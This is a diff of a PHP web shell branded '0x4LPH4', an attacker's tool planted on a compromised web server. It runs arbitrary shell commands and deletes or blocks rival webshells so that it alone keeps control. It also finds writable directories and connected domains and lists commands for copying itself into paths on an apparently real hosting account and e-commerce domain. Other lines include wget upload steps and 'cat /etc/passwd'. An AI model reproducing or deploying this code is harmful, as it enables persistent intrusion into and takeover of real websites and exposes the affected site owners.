+                        if (!empty(trim($line))) {
+                            echo "<span class='cmd-output'>" . htmlspecialchars($line) . "</span>\n";
+                        }
                     }
                 }
                 
-                // Show return status
+                if (!empty($stderr)) {
+                    $lines = explode("\n", $stderr);
+                    foreach ($lines as $line) {
+                        if (!empty(trim($line))) {
+                            echo "<span class='cmd-error'>" . htmlspecialchars($line) . "</span>\n";
+                        }
+                    }
+                }
+                
                 if ($return_var !== 0) {
-                    echo "<span class='cmd-error'>Command exited with status: $return_var</span>\n";
+                    if (empty($stdout) && empty($stderr)) {
+                        echo "<span class='cmd-error'>✗ Command failed (exit code: $return_var)</span>\n";
+                    }
                 } else {
-                    echo "<span class='cmd-success'>Command executed successfully</span>\n";
+                    if (empty($stdout) && empty($stderr)) {
+                        echo "<span class='cmd-success'>✓ Command executed successfully</span>\n";
+                    }
                 }
             } else {
-                echo "<span class='cmd-error'>No output from command. Command may not exist or produced no output.</span>\n";
+                echo "<span class='cmd-error'>✗ Failed to execute command</span>\n";
             }
-            
-            // Rescan for webshells after command execution
-            $new_webshells = scanForWebshells();
-            if (!empty($new_webshells)) {
-                echo "\n<span class='cmd-error'>Controlled by 0x4LPH4: " . count($new_webshells) . " non-0x4LPH4 files blocked and neutralized!</span>\n";
-            }
+        } else {
+            echo "<span class='cmd-error'>$block_reason</span>\n";
+        }
+        
+        end_processing:
+        
+        $new_webshells = scanForWebshells();
+        if (!empty($new_webshells)) {
+            echo "\n<span class='cmd-error'>Controlled by 0x4LPH4: " . count($new_webshells) . " non-0x4LPH4 files blocked and neutralized!</span>\n";
         }
     }
 }
 ?>
 </pre>
     
-    <!-- System Information -->
     <div class="info-box">
         <h3>System Information</h3>
         <?php
         echo "Script: " . $current_script . "<br>";
         echo "PHP Version: " . phpversion() . "<br>";
-        echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
+        echo "Server: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown') . "<br>";
         echo "Current Directory: " . getcwd() . "<br>";
-        echo "<strong>ALLOWED FILES:</strong> ONLY files starting with 0x4LPH4<br>";
-        echo "<strong>BLOCKED:</strong> ALL other files (show blank page)<br>";
+        echo "Real Path: " . realpath(dirname(__FILE__)) . "<br>";
+        echo "<strong>Current Writable Path:</strong> " . htmlspecialchars($_SESSION['writable_path']) . "<br>";
         
-        if (!empty($detected_webshells)) {
-            echo "Non-0x4LPH4 files blocked: " . count($detected_webshells) . "<br>";
+        echo "<strong>Connected Domains:</strong><br>";
+        if (!empty($connected_domains)) {
+            foreach ($connected_domains as $domain) {
+                echo "• " . htmlspecialchars($domain) . "<br>";
+            }
+        } else {
+            echo "None detected<br>";
         }
         
-        // Show command examples
-        echo "<br><strong>Command Examples (NOW WORKING):</strong><br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> wget https://raw.githubusercontent.com/your-repo/0x4LPH4.php -O /var/www/html/0x4LPH4.php<br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm backdoorshell.php - <strong>NOW ALLOWED</strong><br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm -f malicious.txt - <strong>NOW ALLOWED</strong><br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm deface.html - <strong>NOW ALLOWED</strong><br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> cat /etc/passwd - <strong>NOW ALLOWED</strong><br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> ls -la<br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> pwd<br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> whoami<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf / (system destruction)<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf /etc (critical system)<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm /etc/passwd (system file)<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm 0x4LPH4.php (protect this script)<br>";
+        echo "<strong>PROTECTED:</strong> 0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt<br>";
+        echo "<strong>FIXED:</strong> mv/cp commands now work 100%<br>";
         
-        // Show common commands
-        echo "<br><strong>Useful Commands:</strong><br>";
-        echo "• rm backdoorshell.php - Remove webshell<br>";
-        echo "• rm -f malicious.txt - Remove malicious file<br>";
-        echo "• rm deface.html - Remove deface page<br>";
-        echo "• wget URL -O /path/0x4LPH4.php - Upload this script<br>";
-        echo "• curl URL -o /path/0x4LPH4.php - Upload this script<br>";
-        echo "• ls - List files<br>";
-        echo "• cat file.txt - View file content<br>";
-        echo "• pwd - Show current directory<br>";
-        echo "• whoami - Show current user<br>";
-        echo "• uname -a - System information<br>";
+        if (!empty($detected_webshells)) {
+            echo "Non-0x4LPH4 webshells blocked: " . count($detected_webshells) . "<br>";
+        }
+        
+        echo "<br><strong>SPECIAL COMMANDS:</strong><br>";
+        echo "• <code>findwritable</code> - Find all writable directories<br>";
+        echo "• <code>finddomains</code> - Find all connected domains<br>";
+        echo "• <code>setwritable /new/path</code> - Set new writable path<br>";
+        echo "• <code>testwrite /path</code> - Test if path is writable<br>";
+        
+        echo "<br><strong>MOVE/COPY 0X4LPH4 FILES (FIXED):</strong><br>";
+        echo "• <code>mv 0x4LPH4.php /var/www/html/admin/productimages/1005/0x4LPH4.php</code><br>";
+        echo "• <code>cp 0x4LPH4.php /home/cyzricc/public_html/0x4LPH4.php</code><br>";
+        echo "• <code>cp 0x4LPH4.php /home/cyzricc/domains/ecom.cyzric.com/public_html/0x4LPH4.php</code><br>";
+        
+        echo "<br><strong>COMMON PATHS TO TRY:</strong><br>";
+        echo "• /var/www/html/<br>";
+        echo "• /home/cyzricc/public_html/<br>";
+        echo "• /home/cyzricc/domains/ecom.cyzric.com/public_html/<br>";
+        echo "• /tmp/<br>";
+        echo "• /var/tmp/<br>";
+        
+        echo "<br><strong>WORKING COMMANDS EXAMPLES:</strong><br>";
+        echo "• <code>ls -la</code><br>";
+        echo "• <code>pwd</code><br>";
+        echo "• <code>whoami</code><br>";
+        echo "• <code>cat /etc/passwd</code><br>";
         ?>
     </div>
+    
+    <script>
+        // Auto-focus command input
+        document.getElementById('cmd').focus();
+        
+        // Command history
+        var commandHistory = [];
+        var historyIndex = -1;
+        
+        document.getElementById('cmd').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                var cmd = this.value.trim();
+                if (cmd) {
+                    commandHistory.push(cmd);
+                    historyIndex = commandHistory.length;
+                }
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (commandHistory.length > 0) {
+                    if (historyIndex > 0) {
+                        historyIndex--;
+                    }
+                    this.value = commandHistory[historyIndex] || '';
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    this.value = commandHistory[historyIndex] || '';
+                } else {
+                    historyIndex = commandHistory.length;
+                    this.value = '';
+                }
+            }
+        });
+    </script>
 </body>
 </html>
